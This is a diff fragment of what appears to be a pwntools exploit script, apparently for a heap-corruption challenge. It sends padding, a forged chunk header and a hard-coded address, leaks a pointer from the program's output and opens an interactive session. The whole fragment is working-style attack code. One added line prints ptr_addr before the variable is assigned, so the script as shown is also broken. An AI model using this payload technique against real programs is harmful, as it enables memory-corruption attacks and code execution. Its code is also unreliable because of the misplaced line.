@@ -57,7 +57,8 @@ p.sendline("647")
 print p.recv()
 p.send("A"*(640-64-8)+"\x21\x00\x01\x00"+"\x00"*4+"\x00"*64+"\xc8\x30\x60\x00\x00\x00\x00")
 print p.recv()
-p.send("A"*61 +"\n")
+#p.send("A"*61 +"\n")
+p.sendline("A"*1)
 
 print p.recv()
 p.sendline("4")
@@ -67,6 +68,7 @@ p.sendline("0")
 sleep(0.2)
 a = p.recv()
 print a
+print ptr_addr.encode("hex")
 ptr_addr = (a[-120:-110].strip())[::-1]
 print ptr_addr.encode("hex")
 p.interactive()
